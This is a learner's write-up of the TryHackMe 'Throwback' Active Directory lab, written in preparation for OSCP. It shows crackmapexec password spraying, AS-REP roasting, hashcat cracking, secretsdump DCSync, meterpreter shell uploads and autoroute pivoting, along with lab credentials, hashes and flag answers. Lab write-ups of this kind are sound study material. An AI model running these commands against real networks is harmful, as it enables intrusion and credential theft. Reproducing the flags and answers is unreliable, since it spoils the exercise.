# Forsaken

Forsaken by the Timesheet.xlsm file working. I ventured forth naming this section of the Throwback - Forsaken. The rest of the task that managed to complete, happily up to the first DC, pretty much entirely myself. The **only** help I had was prompt to use ipconfig, John Hammond bloodhound information and timekeeper user and password(**I COULD ONLY HAVE GOT THAT IF THE TIMESHEET.xlsm HAD WORKED**), Sharphound did not work so later usages required by the tasks, were required. Given time pressures to complete this and all the compatibility issues I have had trying even with trying to go it hand-held through a majority of the tasks. No excuses just explainations. I learnt alot about how far I need to go to get the methodological chops optimised for the OSCP, where my blindspots are and what vital tools need to be perfectly setup well before my exam in hopefully serval months time.

```bash
proxychains crackmapexec ldap 10.200.102.0/24 -u SQLService -d THROWBACK.local -p mysql337570

SMB         10.200.102.117  445    THROWBACK-DC01   [*] Windows 10.0 Build 17763 x64 (name:THROWBACK-DC01) (domain:THROWBACK.local) (signing:True) (SMBv1:False)
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  THROWBACK.local:389 <--socket error or timeout!
SMB         10.200.102.117  445    THROWBACK-DC01   [-] THROWBACK.local\SQLService:mysql337570 Error connecting to the domain, please add option --kdcHost with the FQDN of the domain controller
<--socket error or timeout!
SMB         10.200.102.176  445    THROWBACK-TIME   [*] Windows 10.0 Build 17763 x64 (name:THROWBACK-TIME) (domain:THROWBACK.local) (signing:False) (SMBv1:False)
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  THROWBACK.local:389 <--socket error or timeout!
SMB         10.200.102.176  445    THROWBACK-TIME   [-] THROWBACK.local\SQLService:mysql337570 Error connecting to the domain, please add option --kdcHost with the FQDN of the domain controller
```

Then tried some smbmap and enum4linux with little success:
```bash
proxychains smbmap -u SQLService -p mysql337570 -d THROWBACK.local -H 10.200.102.117
proxychains smbmap -u SQLService -p mysql337570 -H 10.200.102.117
proxychains enum4linux -a -u SQLService -p mysql337570 10.200.102.176
```

I recursively went back to rooms I had done on THM awhile ago. [Attacktivedirectory](https://tryhackme.com/room/attacktivedirectory) and [Attackingkerberos](https://tryhackme.com/room/attackingkerberos). Installed Kerbrute, ran smbmap:
```bash
proxychains smbmap -u SQLService -p mysql337570 -d THROWBACK.local -H 10.200.102.176 
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.16
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.200.102.176:445  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.200.102.176:445  ...  OK
[+] IP: 10.200.102.176:445      Name: 10.200.102.176                                    
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC
```

Cracked it with `hashcat -m 18200 hash /usr/share/wordlists/rockyou.txt` to get the password:
```{toggle}
animeloverforever
```

Researched Rubeus [Rubeus](https://github.com/GhostPack/Rubeus), unfortunately I consider this a rabbit-hole of troubleshooting and did not consider Empire Agents. **facepalm**.

I tried various proxychained crackmapexec, smbmap and was successful in Abusing Kerberos with GetNPUsers.py I got FoxxR hash.

![forsakenOne](Screenshots/forsakenOne.png)

![forsaken-foxxr-cme-smb](Screenshots/forsaken-foxxr-cme-smb.png)

![forsaken-foxxr-cme-smb-two](Screenshots/forsaken-foxxr-cme-smb-two.png)

![forsaken-no-password](Screenshots/forsaken-no-password.png)

SSH did not connect, RDP did not connect. I need to target the TIME box. I presume the network is probably further segrated. Even from RDP on PROD:

```powershell
PS C:\Users\admin-petersj> ssh FoxxR@10.200.102.117
The authenticity of host '10.200.102.117 (10.200.102.117)' can't be established.
ECDSA key fingerprint is SHA256:QY863K2OeO8g1ykC93nJ/wHoyYB/XCZ9wWouXrQPLiY.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '10.200.102.117' (ECDSA) to the list of known hosts.
Connection reset by 10.200.102.117 port 22
```

I started flailing for solutions:
```bash
proxychains crackmapexec smb 10.200.102.0/24 -u FoxxR -d THROWBACK.local -p animeloverforever
```

I went to back to [karam's writeup](https://0xkaram.github.io/posts/Try-Hack-Me-Throwback-Write-Up/), basically we need the meterpreter RCE on timekeep to pivot onwards. We need to dump the password hashes on TIME, and I can't do that. I have the SQLService, but I need to be on TIME to gain access, possibly.

```{toggle}
Timekeeper: keeperoftime
```

![ontime](Screenshots/ontime.png)

Transfered a meterpreter shell.exe as replacement for the failed upload RCE. Due to me rushing I forgot that the upload that would transfer was an "administrator" who would auot open the Timesheet.xlsm and the meterpreter could then migrate process. The answers I taken from [John Hammond(also root flag on TIME)](https://www.youtube.com/watch?v=ukFC48bzVSM) and [karam's writeup](https://0xkaram.github.io/posts/Try-Hack-Me-Throwback-Write-Up/). 

## Answers

Which user's hashes were we able to dump?
```{toggle}
Timekeeper
```

What is the user's hash starting from the third colon?
```{toggle}
901682b1433fdf0b04ef42b13e34386
```

What is the administrator's hash starting from the third colon?
```{toggle}
43d73c6a52e8626eabc5eb77148dca0b
```

What is the user's cracked password?
```{toggle}
keeperoftime
```

# We gotta drop the load!

POWERING ON: went to `C:xampp\mysql\bin` used the SQLSErvice passwor dfrom before!
![mysql](Screenshots/mysql-initial.png)

Dumped the database to build the tbusers.txt.
```mysql
MariaDB [domain_users]> SELECT * FROM users; 
+----------------------+ 
| name                 |
+----------------------+
| ClemonsD             |
| DunlopM              |
| LoganF               |
| IbarraA              |
| YatesZ               |
| CopelandS            |
| MckeeE               |
| HeatonC              |
| FlowersK             |
| HardinA              |
| BurrowsA             |
| FinneganI            |
| GalindoI             |
| LyonsC               |
| FullerS              |
| SteeleJ              |
| WangG                |
| LoweryR              |
| JeffersD             |
| GreigH               |
| SharpK               |
| KruegerM             |
| ChenI                |
| VillanuevaD          |
| BegumK               |
| TBH{ac3f61048236fd39 |
| 8da9e2289622157e}    |
+----------------------+
27 rows in set (0.002 sec)

MariaDB [pets]> USE timekeepusers 
Database changed
MariaDB [timekeepusers]> SHOW TABLES; 
+-------------------------+ 
| Tables_in_timekeepusers |
+-------------------------+
| users                   |
+-------------------------+
1 row in set (0.001 sec)

MariaDB [timekeepusers]> SELECT * FROM users 
    -> ; 
+---------------+-------------------------------------------------+ 
| USERNAME      | PASSWORD                                        |
+---------------+-------------------------------------------------+
| spopy         | ilylily                                         |
| foxxr         | Fnfdsfdf49sA(2o1id                              |
| winterss      | rei0g0erggdfs(2o1id                             |
| daiban        | Bananas!                                        |
| blairej       | BlaireJ2020                                     |
| FLAG          | TBH{ac3f61048236fd398da9e2289622157e}           |
| daviesj       | FEFJdfjep302dojsdfsFSFD                         |
| horsemanb     | XZCFLDOSPfem,wefweop3202D                       |
| peanutbutterm | fi9sfjidsJXSVNSKXKNXSIOPfpoiewspf               |
| humphreyw     | fedw99fjpfdsjpjpfodspjofpjf99                   |
| jeffersd      | fDSOKFSDFLMmxcvmxz;p[p[dgp[edfjf99              |
| petersj       | owowhatsthisowoDarknessBestGirlowo123uwu");



 |
| foxxr         | ILoveAnimemes :3                                |
| daviesj       | efepjfjsdfjdsfpjopfdj4po                        |
| gongoh        | etregrokdfskggdf'fd4po                          |
| dosierk       | e2349efjsdsdfhgopfdj4po                         |
| murphyf       | PASSWORD                                        |
| jstewart      | e423jjfjdsjfsdj32                               |
+---------------+-------------------------------------------------+
18 rows in set (0.000 sec)


```

For the first set of users, same for the second but I manually remove the space between petersj and foxxr and then the FLAG entry.
```bash
awk '{print $2}' users.txt >> tbusers.txt 
```

Then I copied my wlOneFull.txt to tbpasses.txt and added all the password I had 

```bash
proxychains crackmapexec smb 10.200.102.117 -u tbusers.txt -p tbpasses.txt --continue-on-success
# Weirdly this is not the answer
SMB         10.200.102.117  445    THROWBACK-DC01   [+] THROWBACK.local\HumphreyW:securitycenter

SMB         10.200.102.117  445    THROWBACK-DC01   [+] THROWBACK.local\JeffersD:Throwback2020
```

What user was successfully password sprayed?
```{toggle}
JeffersD
```
What was the password for the user?
```{toggle}
Throwback2020
```

# SYNCHRONIZE

Don't have Bloodhound loot because Sharphound is still broken, ssh-ed in to the DC.

![dc-ssh-jeffersd](Screenshots/dc-ssh-jeffersd.png)

`proxychains /usr/share/doc/python3-impacket/examples/secretsdump.py -dc-ip 10.200.102.117 THROWBACK/backup@10.200.102.117` With the password: `TBH_Backup2348!`

We get alot of hashes [finds them here](Forsaken/secretdump)

```powershell

PS C:\Users\jeffersd> cd Documents
PS C:\Users\jeffersd\Documents> ls


    Directory: C:\Users\jeffersd\Documents


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        8/19/2020  10:13 PM            286 backup_notice.txt


PS C:\Users\jeffersd\Documents> type .\backup_notice.txt
As we backup the servers all staff are to use the backup account for replicating the servers 
Don't use your domain admin accounts on the backup servers.

The credentials for the backup are:
TBH_Backup2348!

Best Regards,
Hans Mercer
Throwback Hacks Security System Administrator
```

## Answers
What user has dcsync rights?
```{toggle}
backup
```
What user can we dump credentials for and is an administrator?
```{toggle}
Hans Mercer
```

# This forest has trust issues

Cracked the MercerH hash to get the password:`pikapikachu7`  then ssh-ed back into DC01.
![dc-dc-enum](Screenshots/dc-dc-enum-one.png)

 I uploaded another meterpreter shell just becuase of terminal speed and got it on the DC for later pivoting. Tried some enumeration commands that failed:
 
```powershell
Get-DomainTrust
Get-DomainTrustMapping
```

This passed me by at silly o'clock in the morning I forgot about Powerview **AND** ADTrust **AND** all the other commands. I was far, far to preoccupied with making meterpreter shell on DC to aid in pivoting through to the next section of Throwback. 

How I found the trusts:
![trust in powerview if you remember](Screenshots/trustissues.png)
You could have use the and Sharphound and Bloodhound to view the output, being that you are the DC on  DC01 or been smart and remember PowerView exists and done this awhile ago.

```powershell
PS C:\Users\MercerH\Desktop> systeminfo
                                                                                
Host Name:                 THROWBACK-DC01
OS Name:                   Microsoft Windows Server 2019 Datacenter
OS Version:                10.0.17763 N/A Build 17763
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Primary Domain Controller
OS Build Type:             Multiprocessor Free
Registered Owner:          EC2
Registered Organization:   Amazon.com
Product ID:                00430-00000-00000-AA103
Original Install Date:     6/24/2020, 11:47:11 PM
System Boot Time:          4/26/2022, 7:30:23 PM
System Manufacturer:       Xen
System Model:              HVM domU
System Type:               x64-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: Intel64 Family 6 Model 63 Stepping 2 GenuineIntel ~2400 Mhz
BIOS Version:              Xen 4.2.amazon, 8/24/2006
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             en-us;English (United States)
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC) Coordinated Universal Time
Total Physical Memory:     4,096 MB
Available Physical Memory: 3,049 MB
Virtual Memory: Max Size:  4,800 MB
Virtual Memory: Available: 3,824 MB
Virtual Memory: In Use:    976 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    THROWBACK.local
Logon Server:              N/A
Hotfix(s):                 17 Hotfix(s) Installed.
                           [01]: KB4552924
                           [02]: KB4470502
                           [03]: KB4470788
                           [04]: KB4480056
                           [05]: KB4493510
                           [06]: KB4494174
                           [07]: KB4499728
                           [08]: KB4504369
                           [09]: KB4512577
                           [10]: KB4512937
                           [11]: KB4521862
                           [12]: KB4523204
                           [13]: KB4539571
                           [14]: KB4549947
                           [15]: KB4561600
                           [16]: KB4562562
                           [17]: KB4561608
Network Card(s):           1 NIC(s) Installed.
                           [01]: AWS PV Network Device
                                 Connection Name: Ethernet
                                 DHCP Enabled:    Yes
                                 DHCP Server:     10.200.102.1
                                 IP address(es)
                                 [01]: 10.200.102.117
                                 [02]: fe80::4466:9154:cce7:465a
Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.

```

I re-ran autoroute, configured and configured and [read](https://docs.metasploit.com/docs/using-metasploit/intermediate/pivoting-in-metasploit.html) and watch John Hammond also struggle with this.

```msfconsole
msf6 exploit(multi/handler) > use post/multi/manage/autoroute
msf6 post(multi/manage/autoroute) > set SESSION 3
SESSION => 3
msf6 post(multi/manage/autoroute) > set SUBNET 10.200.102.0
SUBNET => 10.200.102.0
msf6 post(multi/manage/autoroute) > exploit
```

Tried over and over to ssh into CORP-DC with :`proxychains ssh MercerH@10.200.x.118`, but autoroute was not working:

![AAAAAAautoroute](Screenshots/autoroute-my-goodness.png)

Sometime is definately wrong here, I even restarted metasploit and made the route from the meterpeter shell. It worked for the first meterpreter shell so. This will be a an area of research.

## Answers and flags
```{toggle}
What domain has a trust relationship with THROWBACK.local?
corporate.local
What is the hostname of the machine that has a forest trust with the domain controller?  
CORP-DC01
What is the Administrator account we can use to access the second forest?  
MercerH
What is the name of the file in the Administrator's Documents folder?
server_update.txt
TBH{773e16d57284363e68a4db254860aed1}
TBH{d2368a76214103ac678a7984b4dba5a3}
```

# r/badcode would like a word to the end

Somewhat sadly I sat and watch the last of Throwback as John Hammond Beta tested it. I could not get metasploit autoroute to work, but I felt less bad as I realised that the rest of Throwback was just OSINT and a final second Kerberoasting. I got the DC without help other than `ipconfig /displaydns` command help, Seatbelt has to be run in RDP to work" issue and Bloodhound information as Sharphound has not worked in months as of April 2022. So thankful I did not has OSCP active directory nightmare exam to take.. you could probably manually enumerate, but you would have curate alot of information in stressful context.

https://github.com/RikkaFoxx

https://github.com/RikkaFoxx/Throwback-Time/commit/33f218dcab06a25f2cfb7bf9587ca09e2bfb078c#comments

https://twitter.com/tbhSecurity

![linkedin](Screenshots/rikkalinkedin.png)

## Answers and flags 
```{toggle}
What User has a Github Account?
Rikka Foxx 
What was the user found in github?  
DaviesJ
What password was found in github?  
Management2018
What machine can you access with the credentials?
CORP-ADT01

TBH{7defa0d5b36c72a48e5966fd2493e19e}
TBH{250fd11eadbd01e7ed14196611d7b255}
```



## Answers and flags - Identity Theft is not a Joke Jim & So anyways, I just started hiring...
```{toggle}
What file is on the Administrator's Documents folder?  
email_update.txt
Who wrote the email?  
Karen Dosier
What is her official title in the company?
Human Relations Consulatant

https://www.linkedin.com/in/summer-winters for linkedin flag
```

## Answers and flags - Lost and Found
```{toggle}
TBH{2913c22315f3ce3c873a14e4862dd717} LinkedIn
TBH{53f3a6cb77f633edd9749926b9a9217b} Breach || GTFO
TBH{19b6ca4281bbef3ee060aaf1c2eb4021} Corporate Mail server

What is the Users email who has been affected by the Databreach?
SEC-JStewart@TBHSecurity.com
What was the Users password?  
aqAwM53cW8AgRbfr
What credentials could be found in the Email?
TBSEC_GUEST:WelcomeTBSEC1!
```

## Answers and flags - Kerberoasting II Electric Boogaloo
```{toogle}
What User was vulnerable to Kerberoasting?
TBService
What password could be cracked from the Kerberos Ticket?
securityadmin284650
Submit flags for TBSEC-DC01 in Task 4

TBH{3efabe3366172f3f97d1123f2cc6dfb5}
TBH{ec08beaa9113b47f321b5032a27b220}
```